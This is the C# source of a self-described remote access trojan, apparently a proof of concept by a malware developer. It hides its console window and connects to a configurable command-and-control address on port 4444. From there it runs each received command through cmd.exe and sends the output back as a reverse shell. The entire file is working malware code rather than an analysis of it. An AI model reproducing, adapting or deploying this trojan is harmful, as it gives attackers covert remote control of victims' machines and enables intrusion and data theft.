//Author: Shaddy43
//Designation: Cybersecurity Engineer, reverse engineer and malware developer

//This program can be used as a remote access trojan which communicates on sockets and provides a reverse shell.
//The reverse shell listener could be a custom created server or even netcat.
//In this PoC, i've used netcat as a c2 server for my reverse shell.
//We can specify any ip address and port number for our c2 server in this program.
//I've setup a kali machine on my local network and used netcat to listen and pass commands to this reverse shell.
//Modified, the code to make change directory cd commands accessible.
//A limitation is that, it halts if we start another process and waits for that process to close. Need to fix that!!!

using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;
using System.Linq;

namespace NC_test
{
    class Program
    {

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            //Hide
            ShowWindow(handle, SW_HIDE);

            ExecuteClient();
        }


        static void ExecuteClient()
        {

            try
            {
                // Establish the remote endpoint 
                // for the socket. This example 
                // uses port 11111 on the local 
                // computer.
                //IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
                //IPAddress ipAddr = ipHost.AddressList[0];
                //IPEndPoint localEndPoint = new IPEndPoint(ipAddr, 11111);

                String ip = "YOUR.IP.ADDRESS.HERE";
                IPAddress ipAddr = IPAddress.Parse(ip);
                IPEndPoint localEndPoint = new IPEndPoint(ipAddr, 4444);

                // Creation TCP/IP Socket using 
                // Socket Class Constructor
                Socket sender = new Socket(ipAddr.AddressFamily,
                           SocketType.Stream, ProtocolType.Tcp);

                try
                {
                    // Connect Socket to the remote 
                    // endpoint using method Connect()
                    sender.Connect(localEndPoint);

                    // We print EndPoint information 
                    // that we are connected
                    Console.WriteLine("Socket connected to -> {0} ",
                                  sender.RemoteEndPoint.ToString());

                    string cwd = "";
                    cwd = Directory.GetCurrentDirectory();
                    //Console.WriteLine(cwd);

                    // Creation of messagge that
                    // we will send to Server
                    //byte[] messageSent = Encoding.ASCII.GetBytes("Client connected... <EOF>");
                    byte[] messageSent = Encoding.ASCII.GetBytes(System.Environment.MachineName + "\nPlease give your commands...\n");
                    int byteSent = sender.Send(messageSent);

                    // Data buffer
                    byte[] messageReceived = new byte[2048];

                    // We receive the messagge using 
                    // the method Receive(). This 
                    // method returns number of bytes
                    // received, that we'll use to 
                    // convert them to string
                    while (true)
                    {
                        int byteRecv = sender.Receive(messageReceived);
                        Console.WriteLine("Message from Server -> {0}",
                              Encoding.ASCII.GetString(messageReceived,
                                                         0, byteRecv));

                        ProcessStartInfo processInfo;
                        Process process;

                        processInfo = new ProcessStartInfo("cmd.exe");
                        processInfo.Arguments = "/k ";  // /k runs the commands in same instance
                        processInfo.CreateNoWindow = false;
                        processInfo.UseShellExecute = false;
                        processInfo.RedirectStandardInput = true;
                        processInfo.RedirectStandardOutput = true;
                        processInfo.WorkingDirectory = cwd;  // changing working directory to whatever path i go into
                        processInfo.RedirectStandardError = true;
                        process = Process.Start(processInfo);

                        string cmd_text = Encoding.ASCII.GetString(messageReceived, 0, byteRecv);
                        StreamWriter myStreamWriter = process.StandardInput;
                        myStreamWriter.WriteLine(cmd_text);

                        string output_string = "";
                        string output_string_error = "";
                        if (cmd_text != "")
                        {
                            process.StandardInput.Flush();
                            process.StandardInput.Close();

                            output_string = process.StandardOutput.ReadToEnd();
                            output_string_error = process.StandardError.ReadToEnd();

                            //getting the path from the last line and replacing > with \ for accessible path
                            var lastLine = output_string.Split('\n').Last();
                            lastLine = lastLine.Replace('>', '\\');
                            cwd = Path.GetFullPath(lastLine);
                            //Console.WriteLine(cwd);

                            process.WaitForExit();

                            if (output_string_error != "")
                            {
                                output_string = output_string_error;
                            }

                            if (output_string == "" && output_string_error == "")
                            {
                                output_string = "command executed\n";
                            }
                        }

                        if (cmd_text.Equals("exit"))
                        {
                            process.Close();
                            break;
                        }

                        //removing first line for double path listings
                        output_string = output_string.Remove(output_string.LastIndexOf(Environment.NewLine));

                        //sending output or error
                        byte[] send_output = Encoding.ASCII.GetBytes(output_string);
                        int send_output_bytes = sender.Send(send_output);
                        output_string = "";
                        output_string_error = "";
                    }

                    // Close Socket using 
                    // the method Close()
                    sender.Shutdown(SocketShutdown.Both);
                    sender.Close();
                }

                // Manage of Socket's Exceptions
                catch (ArgumentNullException ane)
                {

                    Console.WriteLine("ArgumentNullException : {0}", ane.ToString());
                }

                catch (SocketException se)
                {

                    Console.WriteLine("SocketException : {0}", se.ToString());
                }

                catch (Exception e)
                {
                    Console.WriteLine("Unexpected exception : {0}", e.ToString());
                }
            }

            catch (Exception e)
            {

                Console.WriteLine(e.ToString());
            }
        }


    }
}
